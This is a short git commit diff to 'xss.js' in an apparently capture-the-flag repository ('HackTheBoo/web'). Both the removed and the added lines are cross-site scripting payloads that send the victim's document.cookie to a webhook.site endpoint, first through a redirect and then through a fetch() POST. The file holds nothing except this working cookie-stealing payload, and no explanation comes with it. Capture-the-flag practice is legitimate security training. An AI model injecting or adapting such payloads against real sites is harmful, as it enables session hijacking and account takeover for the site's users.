7490a2f2762ba4d05f9fe9f136087063c73a915c
Espxrance <78451563+0xEspxrance@users.noreply.github.com>
2022-10-27 16:16:24 -0400

    Update xss.js

--- HackTheBoo/web/xss.js
+++ HackTheBoo/web/xss.js
@@ -1,1 +1,5 @@
-<script>document.location='https://webhook.site/951a8069-3beb-48d5-a21f-99d73d3c95c7/?'+document.cookie</script>
+fetch('https://webhook.site/951a8069-3beb-48d5-a21f-99d73d3c95c7', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+});
